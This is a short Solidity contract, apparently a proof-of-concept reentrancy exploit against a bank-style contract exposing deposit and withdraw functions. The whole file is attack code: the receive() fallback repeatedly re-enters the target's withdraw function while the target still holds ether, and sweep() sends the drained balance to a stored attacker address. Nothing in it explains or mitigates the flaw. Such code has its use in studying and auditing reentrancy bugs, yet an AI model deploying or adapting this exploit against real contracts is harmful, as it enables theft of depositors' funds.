interface IBankTarget {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Reproduction {
    IBankTarget private target;
    address private attacker;

    constructor(address _target) {
        target = IBankTarget(_target);
        attacker = msg.sender;
    }

    function contribute() external payable {
        require(msg.value > 0);
        _deposit();
    }

    function _deposit() internal {
        target.deposit{value: msg.value}();
    }

    function runExploit(uint amt) external {
        require(msg.sender == attacker);
        amt = 1 ether;
        _initiateWithdrawal(amt);
    }

    function _initiateWithdrawal(uint amt) internal {
        amt = 1 ether;        
        target.withdraw(amt);
    }

    receive() external payable {
        _fallbackWithdraw();
    }

    function _fallbackWithdraw() internal {
        if (address(target).balance >= msg.value) {
            target.withdraw(msg.value);
        }
    }

    function sweep() external {
        require(msg.sender == attacker);
        _drainFunds();
    }

    function _drainFunds() internal {
        payable(attacker).transfer(address(this).balance);
    }
}